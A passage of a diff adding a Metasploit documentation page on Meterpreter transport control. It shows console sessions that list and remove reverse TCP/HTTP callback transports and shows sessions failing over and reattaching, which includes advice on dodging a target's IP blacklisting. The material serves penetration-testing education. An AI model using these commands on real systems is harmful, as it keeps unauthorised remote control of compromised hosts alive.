+<span id="cb9-7"><a href="#cb9-7"></a>[<span class="ex">*</span>] 10.1.10.35 - Meterpreter session 3 closed.  Reason: User exit</span>
+<span id="cb9-8"><a href="#cb9-8"></a><span class="ex">msf</span> exploit(handler) <span class="op">&gt;</span> [<span class="ex">*</span>] Meterpreter session 4 opened (10.1.10.40:5105 -<span class="op">&gt;</span> 10.1.10.40:46245) <span class="ex">at</span> 2015-06-02 20:55:07 +1000</span>
+<span id="cb9-9"><a href="#cb9-9"></a></span>
+<span id="cb9-10"><a href="#cb9-10"></a><span class="ex">msf</span> exploit(handler) <span class="op">&gt;</span> <span class="ex">sessions</span> -i 4</span>
+<span id="cb9-11"><a href="#cb9-11"></a>[<span class="ex">*</span>] Starting interaction with 4...</span>
+<span id="cb9-12"><a href="#cb9-12"></a></span>
+<span id="cb9-13"><a href="#cb9-13"></a><span class="ex">meterpreter</span> <span class="op">&gt;</span> transport list</span>
+<span id="cb9-14"><a href="#cb9-14"></a><span class="ex">Session</span> Expiry  : @ 2015-06-09 19:56:05</span>
+<span id="cb9-15"><a href="#cb9-15"></a></span>
+<span id="cb9-16"><a href="#cb9-16"></a>    <span class="ex">Curr</span>  URL                                                                                                    Comms T/O  Retry Total  Retry Wait</span>
+<span id="cb9-17"><a href="#cb9-17"></a>    <span class="ex">----</span>  ---                                                                                                    ---------  -----------  ----------</span>
+<span id="cb9-18"><a href="#cb9-18"></a>    <span class="ex">*</span>     http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/  100000     50000        2500</span>
+<span id="cb9-19"><a href="#cb9-19"></a>          <span class="ex">tcp</span>://10.1.10.40:5005                                                                                  300        3600         10</span>
+<span id="cb9-20"><a href="#cb9-20"></a>          <span class="ex">tcp</span>://10.1.10.40:6000                                                                                  300        3600         10</span></code></pre></div>
+<h3 id="remove-transports">Remove transports</h3>
+<p>It is also possible to remove transports from the underlying transport list. This is valuable in cases where you want Meterpreter to always callback on stageless listeners (allowing you to avoid the unnecessary upload of the second stage), or when you have a listener located at an IP address that may have been blacklisted by your target as a result of your post-exploitation shenanigans.</p>
+<p>The command is similar to <code>add</code> in that it takes a subset of the parameters, and then adds a new one on top of it:</p>
+<ul>
+<li><code>-t</code> - The transport type.</li>
+<li><code>-l</code> - The <code>LHOST</code> value (unless it’s <code>bind_tcp</code>).</li>
+<li><code>-p</code> - The <code>LPORT</code> value.</li>
+<li><code>-u</code> - This value is only required for <code>reverse_http/s</code> transports and needs to contain the URI of the transport in question. This is important because there might be multiple listeners on the same IP and port, so the URI is what differentiates each of the sessions.</li>
+</ul>
+<div class="sourceCode" id="cb10"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1"></a>[<span class="ex">*</span>] Starting interaction with 2...</span>
+<span id="cb10-2"><a href="#cb10-2"></a></span>
+<span id="cb10-3"><a href="#cb10-3"></a><span class="ex">meterpreter</span> <span class="op">&gt;</span> transport list</span>
+<span id="cb10-4"><a href="#cb10-4"></a><span class="ex">Session</span> Expiry  : @ 2015-07-10 07:39:08</span>
+<span id="cb10-5"><a href="#cb10-5"></a></span>
+<span id="cb10-6"><a href="#cb10-6"></a>    <span class="ex">Curr</span>  URL                                                                                                             Comms T/O  Retry Total  Retry Wait</span>
+<span id="cb10-7"><a href="#cb10-7"></a>    <span class="ex">----</span>  ---                                                                                                             ---------  -----------  ----------</span>
+<span id="cb10-8"><a href="#cb10-8"></a>    <span class="ex">*</span>     tcp://10.1.10.40:5000                                                                                           300        3600         10</span>
+<span id="cb10-9"><a href="#cb10-9"></a>          <span class="ex">http</span>://10.1.10.40:9090/jYGS61OX8On-Dv8Pq5v9FAJAEobAlrL4J2FBOf_3DsnZzCJAY6-Dh_8AeWdrkFwRbQdvz4vOo8let4huygVLPJ/  300        3600         10</span>
+<span id="cb10-10"><a href="#cb10-10"></a></span>
+<span id="cb10-11"><a href="#cb10-11"></a><span class="ex">meterpreter</span> <span class="op">&gt;</span> transport remove -t reverse_http -l 10.1.10.40 -p 9090 -u jYGS61OX8On-Dv8Pq5v9FAJAEobAlrL4J2FBOf_3DsnZzCJAY6-Dh_8AeWdrkFwRbQdvz4vOo8let4huygVLPJ</span>
+<span id="cb10-12"><a href="#cb10-12"></a>[<span class="ex">*</span>] Removing transport ...</span>
+<span id="cb10-13"><a href="#cb10-13"></a>[<span class="ex">+</span>] Successfully removed reverse_http transport.</span>
+<span id="cb10-14"><a href="#cb10-14"></a><span class="ex">meterpreter</span> <span class="op">&gt;</span> transport list</span>
+<span id="cb10-15"><a href="#cb10-15"></a><span class="ex">Session</span> Expiry  : @ 2015-07-10 07:39:08</span>
+<span id="cb10-16"><a href="#cb10-16"></a></span>
+<span id="cb10-17"><a href="#cb10-17"></a>    <span class="ex">Curr</span>  URL                    Comms T/O  Retry Total  Retry Wait</span>
+<span id="cb10-18"><a href="#cb10-18"></a>    <span class="ex">----</span>  ---                    ---------  -----------  ----------</span>
+<span id="cb10-19"><a href="#cb10-19"></a>    <span class="ex">*</span>     tcp://10.1.10.40:5000  300        3600         10</span>
+<span id="cb10-20"><a href="#cb10-20"></a></span>
+<span id="cb10-21"><a href="#cb10-21"></a><span class="ex">meterpreter</span> <span class="op">&gt;</span> </span></code></pre></div>
+<h3 id="resilient-transports">Resilient transports</h3>
+<p>Previously, Meterpreter only had built-in resiliency in the <code>HTTP/S</code> payloads and this was due to the nature of <code>HTTP/S</code> as a stateless protocol. Meterpreter now has resiliency features baked into <code>TCP</code> transports as well, both <code>reverse</code> and <code>bind</code>. If communication fails on a given transport, Meterpreter will roll over to the next one automatically.</p>
+<p>The following shows Metasploit being closed and leaving the existing <code>TCP</code> session running behind the scenes:</p>
+<div class="sourceCode" id="cb11"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1"></a><span class="ex">meterpreter</span> <span class="op">&gt;</span> transport list</span>
+<span id="cb11-2"><a href="#cb11-2"></a><span class="ex">Session</span> Expiry  : @ 2015-06-09 19:56:05</span>
+<span id="cb11-3"><a href="#cb11-3"></a></span>
+<span id="cb11-4"><a href="#cb11-4"></a>    <span class="ex">Curr</span>  URL                                                                                                    Comms T/O  Retry Total  Retry Wait</span>
+<span id="cb11-5"><a href="#cb11-5"></a>    <span class="ex">----</span>  ---                                                                                                    ---------  -----------  ----------</span>
+<span id="cb11-6"><a href="#cb11-6"></a>    <span class="ex">*</span>     tcp://10.1.10.40:6000                                                                                  300        3600         10</span>
+<span id="cb11-7"><a href="#cb11-7"></a>          <span class="ex">http</span>://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/  100000     50000        2500</span>
+<span id="cb11-8"><a href="#cb11-8"></a>          <span class="ex">tcp</span>://10.1.10.40:5005                                                                                  300        3600         10</span>
+<span id="cb11-9"><a href="#cb11-9"></a></span>
+<span id="cb11-10"><a href="#cb11-10"></a><span class="ex">meterpreter</span> <span class="op">&gt;</span> background</span>
+<span id="cb11-11"><a href="#cb11-11"></a>[<span class="ex">*</span>] Backgrounding session 5...</span>
+<span id="cb11-12"><a href="#cb11-12"></a><span class="ex">msf</span> exploit(handler) <span class="op">&gt;</span> <span class="bu">exit</span> -y</span></code></pre></div>
+<p>With Metasploit closed, the Meterpreter session has detected that the transport is no longer functioning. Behind the scenes, Meterpreter has shut down this <code>TCP</code> transport, and has automatically moved over to the <code>HTTP</code> transport as this was the next transport in the list. From here, Meterpreter continues to try to re-establish connectivity with Metasploit on this transport a per the transport timeout settings.</p>
+<p>The following output shows Metasploit being re-launched with the appropriate listeners, and the existing Meterpreter instance establishing a session automatically:</p>
+<div class="sourceCode" id="cb12"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb12-1"><a href="#cb12-1"></a><span class="ex">./msfconsole</span> -r ~/msf.rc</span>
+<span id="cb12-2"><a href="#cb12-2"></a>[<span class="ex">*</span>] Starting the Metasploit Framework console...<span class="kw">|</span></span>
+<span id="cb12-3"><a href="#cb12-3"></a><span class="ex">IIIIII</span>    dTb.dTb        _.---._</span>
+<span id="cb12-4"><a href="#cb12-4"></a>  <span class="ex">II</span>     4<span class="st">&#39;  v  &#39;</span>B   .<span class="st">&#39;&quot;&quot;.&#39;</span>/<span class="kw">|</span><span class="dt">\`</span><span class="ex">.</span><span class="st">&quot;&quot;&#39;.</span></span>
+<span id="cb12-5"><a href="#cb12-5"></a><span class="st">  II     6.     .P  :  .&#39;</span> / <span class="kw">|</span> <span class="ex">\ </span><span class="kw">`</span><span class="bu">.</span>  <span class="bu">:</span></span>
+<span id="cb12-6"><a href="#cb12-6"></a>  <span class="ex">II</span>     <span class="st">&#39;T;. .;P&#39;</span>  <span class="st">&#39;.&#39;</span>  /  <span class="kw">|</span>  <span class="ex">\ </span> <span class="kw">`</span>.<span class="st">&#39;</span></span>
+<span id="cb12-7"><a href="#cb12-7"></a><span class="st">  II      &#39;</span>T<span class="kw">;</span> ;<span class="ex">P</span><span class="st">&#39;    `. /   |   \ .&#39;</span></span>
+<span id="cb12-8"><a href="#cb12-8"></a><span class="ex">IIIIII</span>     <span class="st">&#39;YvP&#39;</span>       <span class="kw">`</span><span class="ex">-.__</span><span class="kw">|</span><span class="ex">__.-</span><span class="st">&#39;</span></span>
+<span id="cb12-9"><a href="#cb12-9"></a></span>
+<span id="cb12-10"><a href="#cb12-10"></a><span class="st">I love shells --egypt</span></span>
+<span id="cb12-11"><a href="#cb12-11"></a></span>
+<span id="cb12-12"><a href="#cb12-12"></a></span>
+<span id="cb12-13"><a href="#cb12-13"></a><span class="st">       =[ metasploit v4.11.0-dev [core:4.11.0.pre.dev api:1.0.0]]</span></span>
+<span id="cb12-14"><a href="#cb12-14"></a><span class="st">+ -- --=[ 1460 exploits - 835 auxiliary - 229 post        ]</span></span>
+<span id="cb12-15"><a href="#cb12-15"></a><span class="st">+ -- --=[ 426 payloads - 37 encoders - 8 nops             ]</span></span>
+<span id="cb12-16"><a href="#cb12-16"></a><span class="st">+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]</span></span>
+<span id="cb12-17"><a href="#cb12-17"></a></span>
+<span id="cb12-18"><a href="#cb12-18"></a><span class="st">... snip ...</span></span>
+<span id="cb12-19"><a href="#cb12-19"></a></span>
+<span id="cb12-20"><a href="#cb12-20"></a><span class="st">[*] 10.1.10.40:46457 (UUID: 8e97549ed2baf6a8/x86_64=2/windows=1/2015-06-02T09:56:05Z) Attaching orphaned/stageless session ...</span></span>
+<span id="cb12-21"><a href="#cb12-21"></a><span class="st">[*] Meterpreter session 1 opened (10.1.10.40:5105 -&gt; 10.1.10.40:46457) at 2015-06-02 21:03:55 +1000</span></span>
+<span id="cb12-22"><a href="#cb12-22"></a></span>
+<span id="cb12-23"><a href="#cb12-23"></a><span class="st">msf exploit(handler) &gt; sessions -l</span></span>
+<span id="cb12-24"><a href="#cb12-24"></a></span>
+<span id="cb12-25"><a href="#cb12-25"></a><span class="st">Active sessions</span></span>
+<span id="cb12-26"><a href="#cb12-26"></a><span class="st">===============</span></span>
+<span id="cb12-27"><a href="#cb12-27"></a></span>
+<span id="cb12-28"><a href="#cb12-28"></a><span class="st">  Id  Type                   Information                           Connection</span></span>
+<span id="cb12-29"><a href="#cb12-29"></a><span class="st">  --  ----                   -----------                           ----------</span></span>
+<span id="cb12-30"><a href="#cb12-30"></a><span class="st">  1   meterpreter x86/win32  WIN-S45GUQ5KGVK\OJ @ WIN-S45GUQ5KGVK  10.1.10.40:5105 -&gt; 10.1.10.40:46457 (10.1.10.35)</span></span>
+<span id="cb12-31"><a href="#cb12-31"></a></span>
+<span id="cb12-32"><a href="#cb12-32"></a><span class="st">msf exploit(handler) &gt; sessions -i 1</span></span>
+<span id="cb12-33"><a href="#cb12-33"></a><span class="st">[*] Starting interaction with 1...</span></span>
+<span id="cb12-34"><a href="#cb12-34"></a></span>
+<span id="cb12-35"><a href="#cb12-35"></a><span class="st">meterpreter &gt; transport list</span></span>
+<span id="cb12-36"><a href="#cb12-36"></a><span class="st">Session Expiry  : @ 2015-06-09 19:56:05</span></span>
+<span id="cb12-37"><a href="#cb12-37"></a></span>
+<span id="cb12-38"><a href="#cb12-38"></a><span class="st">    Curr  URL                                                                                                    Comms T/O  Retry Total  Retry Wait</span></span>
+<span id="cb12-39"><a href="#cb12-39"></a><span class="st">    ----  ---                                                                                                    ------</span></span>
+<span id="cb12-40"><a href="#cb12-40"></a><span class="st">    ---  -----------  ----------</span></span>
+<span id="cb12-41"><a href="#cb12-41"></a><span class="st">    *     http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/  100000     50000        2500</span></span>
+<span id="cb12-42"><a href="#cb12-42"></a><span class="st">          tcp://10.1.10.40:5005                                                                                  300        3600         10</span></span>
+<span id="cb12-43"><a href="#cb12-43"></a><span class="st">          tcp://10.1.10.40:6000                                                                                  300        3600         10</span></span></code></pre></div>
+<p>The session is back up and running as if nothing had gone wrong.</p>
+<p>In the case where Meterpreter is configured with only a single transport mechanism, this process still takes place. Meterpreter’s transport list implementation is a cyclic linked-list, and once the end of the list has been reached, it simply starts from the beginning again. This means that if there’s a list of one transport then Meterpreter will continually attempt to use that one transport until the session expires. This works for both <code>TCP</code> and <code>HTTP/S</code>.</p>
+<p>For important detail on network resiliency, please see the <a href="https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Reliable-Network-Communication">reliable network communication documentation</a>.</p>
+<h2 id="supported-meterpreters">Supported Meterpreters</h2>
+<p>The following Meterpreter implementations currently support the transport commands:</p>
+<ul>
+<li>Windows x86</li>
+<li>Windows x64</li>
+<li>POSIX x86</li>
+<li>Android</li>
+<li>Java</li>
+<li>Python</li>
+</ul>
+
+</div> <!-- article-content -->
+
+<div id="footer-nav-bar">
+<div><a href="how-payloads-work.html">←prev</a></div><div class="nav-bar-push"><a href="debugging-dead-sessions.html">next→</a></div>
+</div>
+
+</div> <!-- article-box -->
+
+</div> <!-- trunk-box -->
+
+<div id="my-footer">
+<p>Copyright <a href="https://metasploit.com/">Metasploit</a>, 2020</p>
+<p><a href="https://join.slack.com/t/metasploit/shared_invite/enQtOTMxMjg5ODY3NDYxLTYyZTVlNDM1ZTI3ZGQ0YTQ0NmI1YjgxMGEwYzFhOWNiZWQ4NDNmNTE1MWNiYzJhMzgwMGY0ZWY2NTY0MjA2M2I">Slack team - metasploit.slack.com</a></p>
+<p><a href="https://twitter.com/metasploit">#twitter handle - @metasploit</a></p>
+<p><a href="mailto:msfdev@metasploit.com">development questions - msfdev [ @ ] metasploit.com</a></p><br/>
+<a href="transport-control.md">Pandoc-Markdown source for this page</a><br/>
+(Docs processed by
+<a href="http://www.unexpected-vortices.com/sw/rippledoc/index.html">Rippledoc</a>.)
+</div> <!-- my-footer -->
+
+</div> <!-- main-outer-box -->
+
+</body>
+</html>
